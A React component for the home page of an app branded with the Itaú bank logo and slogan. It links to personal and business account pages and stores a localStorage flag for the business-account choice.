import React from 'react'
import {Link} from 'react-router-dom'
import './Home.css'

const Home = () => {
    localStorage.setItem("isJuridica", "false");

    const setCnpj = () => {
        localStorage.setItem("isJuridica", "true");
    }
  return (
    <div className='Home'>
        <div className='container'>
            <div className='logo'>
                <img src="https://www.itau.com.br/media/dam/m/538533fcf33fd411/original/itau-logo-branco-48x48.png" alt="logo_itau" />
            </div>
            <div className='title'>
                <Link className='linker' to="/panel"><span>Um Itaú de vantagens,<br />mais simples e seguro<br />pra você</span></Link>
            </div>
            <div className='actions'>
                <Link to="/contapf"><button>conta pessoa física</button></Link>
                <Link to="/contapj" onClick={() => setCnpj()}><button>conta pessoa jurídica</button></Link>
            </div>
        </div>
    </div>
  )
}

export default Home